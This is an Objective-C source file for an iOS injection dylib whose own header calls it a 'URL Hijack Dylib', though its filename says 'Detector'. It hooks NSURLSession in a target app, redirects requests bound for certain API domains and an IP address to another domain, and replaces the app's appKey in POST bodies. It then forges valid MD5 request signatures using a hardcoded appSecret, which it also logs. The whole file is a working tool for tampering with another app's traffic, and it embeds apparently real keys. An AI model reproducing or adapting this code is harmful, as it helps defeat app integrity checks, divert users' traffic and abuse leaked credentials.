// URLHijackDetector.m
// iOS URL Hijack Dylib - 支持重新计算签名
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <CommonCrypto/CommonDigest.h>

#pragma mark - 配置区

// 需要处理的目标域名/IP
static NSSet<NSString *> *getTargetDomains(void) {
    return [NSSet setWithArray:@[
        @"api1.7ccccccc.com",
        @"api2.7ccccccc.com", 
        @"api3.7ccccccc.com",
        @"45.205.27.82:8080"
    ]];
}

// 需要重定向的IP列表
static NSSet<NSString *> *getRedirectIPs(void) {
    return [NSSet setWithArray:@[
        @"45.205.27.82:8080"
    ]];
}

// 劫持后重定向的新域名
static NSString *getNewDomain(void) {
    return @"api123.hezijun.top";
}

// appSecret
static NSString *getAppSecret(void) {
    return @"XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx";
}

#pragma mark - 加密工具函数

static NSString* md5(NSString *string) {
    const char *cStr = [string UTF8String];
    unsigned char digest[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), digest);
    
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for(int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) {
        [output appendFormat:@"%02x", digest[i]];
    }
    return output;
}

#pragma mark - 签名计算

static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
    // 1. 参数排序并拼接 (k1=v1&k2=v2&kn=vn)
    NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
    NSMutableString *paramString = [NSMutableString string];
    for (NSString *key in sortedKeys) {
        if ([key isEqualToString:@"sign"]) continue; // 跳过原签名
        if (paramString.length > 0) {
            [paramString appendString:@"&"];
        }
        [paramString appendFormat:@"%@=%@", key, params[key]];
    }
    
    // 2. 拼接签名原串: httpMethod + host + path + 参数 + appSecret
    NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                               httpMethod, host, path, paramString, appSecret];
    
    NSLog(@"[Hijack] String to sign: %@", stringToSign);
    
    // 3. MD5
    return md5(stringToSign);
}

#pragma mark - 请求参数修改

static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NSString *httpMethod, NSString *host, NSString *path) {
    if (!originalBody) return originalBody;
    
    NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
    if (!bodyString) return originalBody;
    
    // 解析参数
    NSMutableDictionary *params = [NSMutableDictionary dictionary];
    NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *kv = [pair componentsSeparatedByString:@"="];
        if (kv.count == 2) {
            params[kv[0]] = kv[1];
        }
    }
    
    // 替换 appKey
    NSString *oldAppKey = @"LWtAvVixXX39mGYL2w";
    NSString *newAppKey = @"QLObIPwnDOVts3mzw9";
    
    if ([params[@"appKey"] isEqualToString:oldAppKey]) {
        NSLog(@"[Hijack] Replacing appKey: %@ -> %@", oldAppKey, newAppKey);
        params[@"appKey"] = newAppKey;
        
        // 重新计算签名
        NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
        params[@"sign"] = newSign;
        
        NSLog(@"[Hijack] New sign: %@", newSign);
        
        // 重新构建 body
        NSMutableArray *newPairs = [NSMutableArray array];
        for (NSString *key in params) {
            [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
        }
        NSString *newBodyString = [newPairs componentsJoinedByString:@"&"];
        
        return [newBodyString dataUsingEncoding:NSUTF8StringEncoding];
    }
    
    return originalBody;
}

#pragma mark - URL 匹配与替换

static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
    NSURL *url = [NSURL URLWithString:originalURLString];
    if (!url) return originalURLString;
    
    NSString *host = url.host;
    if (!host) return originalURLString;
    
    // 保存原始 host 和 path
    if (outHost) *outHost = host;
    if (outPath) *outPath = url.path;
    
    // 处理带端口的 host
    NSString *hostWithPort = nil;
    if (url.port) {
        hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
    }
    
    // 检查是否需要重定向
    BOOL needsRedirect = NO;
    if (hostWithPort && [getRedirectIPs() containsObject:hostWithPort]) {
        needsRedirect = YES;
    } else if ([getRedirectIPs() containsObject:host]) {
        needsRedirect = YES;
    }
    
    if (needsRedirect) {
        // 替换为新域名
        NSString *newURLString = originalURLString;
        newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
                                                               withString:getNewDomain()];
        if (url.port) {
            NSString *oldPortStr = [NSString stringWithFormat:@":%d", [url.port intValue]];
            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldPortStr 
                                                                   withString:@""];
        }
        
        // 更新 host 为新的域名
        if (outHost) *outHost = getNewDomain();
        
        NSLog(@"[Hijack] URL redirected: %@ -> %@", originalURLString, newURLString);
        return newURLString;
    }
    
    return originalURLString;
}

// 检查请求是否需要处理
static BOOL isTargetRequest(NSString *urlString) {
    NSURL *url = [NSURL URLWithString:urlString];
    if (!url) return NO;
    
    NSString *host = url.host;
    if (!host) return NO;
    
    if ([getTargetDomains() containsObject:host]) {
        return YES;
    }
    
    if (url.port) {
        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
        if ([getTargetDomains() containsObject:hostWithPort]) {
            return YES;
        }
    }
    
    return NO;
}

#pragma mark - NSURLSession Hook

@interface NSURLSession (Hijack)
@end

@implementation NSURLSession (Hijack)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [NSURLSession class];
        
        SEL originalSelector = @selector(dataTaskWithRequest:completionHandler:);
        SEL swizzledSelector = @selector(hijacked_dataTaskWithRequest:completionHandler:);
        
        Method originalMethod = class_getInstanceMethod(class, originalSelector);
        
        if (!originalMethod) return;
        
        __block id replacementBlock = ^(id self, NSURLRequest *request, void (^completionHandler)(NSData*, NSURLResponse*, NSError*)) {
            return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
        };
        
        class_addMethod(class, swizzledSelector, imp_implementationWithBlock(replacementBlock), "@@:@?");
        
        Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
        
        if (originalMethod && swizzledMethod) {
            method_exchangeImplementations(originalMethod, swizzledMethod);
        }
    });
}

- (NSURLSessionDataTask *)hijacked_dataTaskWithRequest:(NSURLRequest *)request 
                                      completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    
    NSString *originalURLString = request.URL.absoluteString;
    NSMutableURLRequest *mutableRequest = [request mutableCopy];
    BOOL modified = NO;
    
    // 检查是否是目标请求
    if (isTargetRequest(originalURLString)) {
        
        NSString *host = nil;
        NSString *path = nil;
        
        // 1. 处理 URL 重定向
        NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
        if (![newURLString isEqualToString:originalURLString]) {
            [mutableRequest setURL:[NSURL URLWithString:newURLString]];
            modified = YES;
        } else {
            // 获取原始 host 和 path
            NSURL *url = [NSURL URLWithString:originalURLString];
            host = url.host;
            path = url.path;
        }
        
        // 2. 修改请求体中的 appKey 并重新计算签名
        if ([request.HTTPMethod isEqualToString:@"POST"] && request.HTTPBody) {
            NSData *newBody = modifyRequestBody(request.HTTPBody, originalURLString, request.HTTPMethod, host, path);
            if (newBody != request.HTTPBody) {
                [mutableRequest setHTTPBody:newBody];
                [mutableRequest setValue:[NSString stringWithFormat:@"%lu", (unsigned long)newBody.length] 
                      forHTTPHeaderField:@"Content-Length"];
                modified = YES;
            }
        }
    }
    
    if (!modified) {
        return [self hijacked_dataTaskWithRequest:request completionHandler:completionHandler];
    }
    
    return [self hijacked_dataTaskWithRequest:mutableRequest completionHandler:completionHandler];
}

@end

__attribute__((constructor))
static void initialize() {
    NSLog(@"[Hijack] URL Hijack Detector loaded - 签名重算模式已启用");
    NSLog(@"[Hijack] AppSecret: XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx");
    NSLog(@"[Hijack] 目标域名: api1/2/3.7ccccccc.com (仅改appKey)");
    NSLog(@"[Hijack] 目标IP: 45.205.27.82:8080 (重定向+改appKey)");
}
